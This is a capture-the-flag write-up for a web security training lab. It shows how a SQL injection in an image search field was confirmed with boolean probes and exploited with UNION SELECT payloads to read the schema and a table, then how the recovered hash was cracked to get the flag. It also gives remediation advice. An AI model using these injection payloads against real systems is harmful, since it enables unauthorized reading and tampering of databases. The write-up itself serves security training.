#02_BlindInjectionSQL_images

##Research explanation
- On the main page, there is another call to action called "Search Image".
- On the next page, we can see a search field. Let's see if it is protected or not against SQL injections. We will check if there is a possibility of a breach by checking the possible differences between a valid result and an invalid result: 1 and 1=1 are returning a result (true state), and 1 and 1=2 are returning nothing (false state).
- Let's now use the SQL command to get again the DB structure (the one used to find the 4th flag - Search Member): 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
- Let's query the 'list_images' table using the different available fields:
id, URL, title, comment.
- When I used this SQL query: 1 UNION SELECT title, comment FROM list_images 
it was possible to notice one image which contains:
ID: 1 UNION SELECT title, comment FROM list_images 
Title: If you read this, just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
- I decripted the hash, using the dcode hash website -  https://www.dcode.fr/fonction-hash
=> 1928e8083cf461a51303633093573c46 : albatroz
- Then I aply a Sh256 encryption on the 'albatroz' key and I got this flag:
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

##Breach Details 
- SQL injection is a common breach (especially on PHP apps).
- It is an: insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system.
- According to OWASP, SQL injection attacks allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server.

Recommendation: 
- SQL Injection flaws are introduced when software developers create dynamic database queries that include user-supplied input. To avoid SQL injection flaws is simple. Developers need to either: 
a) stop writing dynamic queries; and/or 
b) prevent user-supplied input which contains malicious SQL from affecting the logic of the executed query. Some solutions: The use of prepared statements with variable binding (aka parameterized queries) is a suitable solution. Parameterized queries force the developer first to define all the SQL code and then pass each parameter to the query later. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied. Input validation can also be a good defense to detect unauthorized input before it is passed to the SQL query.
c) send generic error message,
d) It is also important to hide one or more sensitive parts of the DB, such as 'information.schema'. You can do it using 'phpmyadmin' in the 'config.inc.php' file and add: 
	$cfg['Servers'][$i]['hide_db'] = 'information_schema|performance_schema|mysql';

##How to:
- Input '1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS' in the search image field
- Input '1 UNION SELECT title, comment FROM list_images ' in the search image field
- Decode the hash using 'https://www.dcode.fr/fonction-hash'
- Lower the word obtained and encrypt it with sh256 on the same website
- The flag is there.